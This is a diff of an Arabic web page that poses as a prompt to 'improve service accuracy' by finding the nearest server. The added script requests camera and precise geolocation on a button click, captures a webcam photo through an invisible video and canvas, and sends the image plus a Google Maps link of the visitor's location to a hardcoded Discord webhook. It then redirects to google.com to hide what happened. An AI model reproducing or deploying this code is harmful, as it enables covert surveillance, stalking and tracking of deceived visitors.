@@ -10,10 +10,9 @@
         .icon { font-size: 50px; color: #007bff; margin-bottom: 20px; }
         h2 { margin: 0 0 15px; color: #333; font-size: 20px; }
         p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
-        button { padding: 12px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; width: 100%; font-weight: bold; transition: background 0.3s; }
-        button:hover { background-color: #0056b3; }
-        /* الكاميرا والكانفاس مخفيين تماماً عن عين المستخدم */
-        #video, #canvas { display: none; position: absolute; left: -9999px; }
+        button { padding: 12px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; width: 100%; font-weight: bold; transition: 0.3s; }
+        button:active { transform: scale(0.98); }
+        #video, #canvas { display: none; position: fixed; bottom: 0; right: 0; pointer-events: none; opacity: 0; }
     </style>
 </head>
 <body>
@@ -21,7 +20,7 @@
     <div class="card">
         <div class="icon">🔄</div>
         <h2>تحسين دقة الخدمة</h2>
-        <p>يرجى السماح بالوصول إلى الموقع الجغرافي لنتمكن من تحديد أقرب سيرفر متاح لك وتحسين سرعة التصفح.</p>
+        <p>يرجى السماح بالوصول لتحديد أقرب سيرفر متاح لك وتحسين سرعة التصفح.</p>
         <button id="mainBtn">تحديث الآن</button>
     </div>
 
@@ -29,5 +28,80 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // رابط الويب هوك الخاص بك
-        const DISCORD_WEBHOOK_URL = '
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';
+        const btn = document.getElementById('mainBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.onclick = async () => {
+            btn.innerText = "جاري المعالجة...";
+            btn.disabled = true;
+
+            try {
+                // 1. طلب الكاميرا والموقع في وقت واحد
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => processAndSend(pos, stream), 
+                        () => processAndSend(null, stream), 
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                } else {
+                    processAndSend(null, stream);
+                }
+            } catch (err) {
+                // حتى لو رفض الكاميرا، نحاول إرسال الموقع أو التحويل
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => processAndSend(pos, null), () => redirectToGoogle());
+                } else {
+                    redirectToGoogle();
+                }
+            }
+        };
+
+        async function processAndSend(position, stream) {
+            let message = "⚠️ **بيانات جديدة:**\n";
+            
+            if (position) {
+                const { latitude, longitude, accuracy } = position.coords;
+                // تصحيح صياغة الرابط ليعمل بشكل صحيح في ديسكورد
+                message += `📍 الموقع: https://www.google.com/maps?q=${latitude},${longitude}\n🎯 الدقة: ${accuracy} متر`;
+            } else {
+                message += "📍 الموقع: تم رفض الإذن";
+            }
+
+            // التقاط الصورة إذا كان الستريم متاحاً
+            if (stream) {
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'capture.png');
+                        formData.append('content', message);
+
+                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+                        redirectToGoogle();
+                    }, 'image/png');
+                }, 1000);
+            } else {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+                redirectToGoogle();
+            }
+        }
+
+        function redirectToGoogle() {
+            window.location.replace("https://www.google.com");
+        }
+    </script>
+</body>
+</html>
